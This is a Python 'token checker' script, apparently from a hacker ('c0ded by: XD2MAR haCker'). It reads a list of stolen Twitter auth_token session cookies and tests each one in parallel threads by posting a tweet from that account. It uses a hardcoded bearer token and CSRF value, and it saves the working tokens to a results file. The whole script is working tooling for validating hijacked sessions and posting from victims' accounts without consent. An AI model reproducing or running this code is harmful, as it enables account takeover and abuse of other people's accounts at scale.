import requests
import sys
import time
import random
import colorama
from colorama import Fore
import os
import string
from concurrent.futures import ThreadPoolExecutor



logo = '''▒██   ██▒▓█████▄  ███▄ ▄███▓ ▄▄▄       ██▀███  
▒▒ █ █ ▒░▒██▀ ██▌▓██▒▀█▀ ██▒▒████▄    ▓██ ▒ ██▒
░░  █   ░░██   █▌▓██    ▓██░▒██  ▀█▄  ▓██ ░▄█ ▒
 ░ █ █ ▒ ░▓█▄   ▌▒██    ▒██ ░██▄▄▄▄██ ▒██▀▀█▄  
▒██▒ ▒██▒░▒████▓ ▒██▒   ░██▒ ▓█   ▓██▒░██▓ ▒██▒
▒▒ ░ ░▓ ░ ▒▒▓  ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░
░░   ░▒ ░ ░ ▒  ▒ ░  ░      ░  ▒   ▒▒ ░  ░▒ ░ ▒░
 ░    ░   ░ ░  ░ ░      ░     ░   ▒     ░░   ░ 
 ░    ░     ░           ░         ░  ░   ░     
          ░                                    

c0ded by: XD2MAR haCker 
snapchat: d2mar
        '''


os.system('cls' if os.name == 'nt' else 'clear')
print(logo)


def check(token):    
   

    with requests.Session() as s:
        url = s.post('https://api.twitter.com/1.1/statuses/update.json',
                                            headers={
                                                'authority':'api.twitter.com',
                                                'method':'POST',
                                                'accept':'/',
                                                'accept-encoding':'gzip, deflate, br',
                                                'authorization':'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
                                                'content-type':'application/x-www-form-urlencoded',
                                                'cookie':'ct0=198a0926052b1eb8f90049783ddd8354; auth_token='+token,
                                                'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36',
                                                'x-csrf-token':'198a0926052b1eb8f90049783ddd8354',
                                                },
                                            data={'status':'#d2amar test'})
        if url.status_code == 200 or url.status_code == 403:
            print(Fore.GREEN,token,' is valid ',url.status_code)
            with open('results.txt','a+') as f:
                f.write(token+'\n')
        else:
            print(Fore.RED,token,' is not valid ',url.status_code)
    
       

if __name__ == "__main__":
    fil = open(sys.argv[1],'r').readlines()
    with ThreadPoolExecutor(max_workers=int(sys.argv[2])) as pool_exe:
        for i in fil:
            i = i.rstrip()
            pool_exe.submit(check,i)           
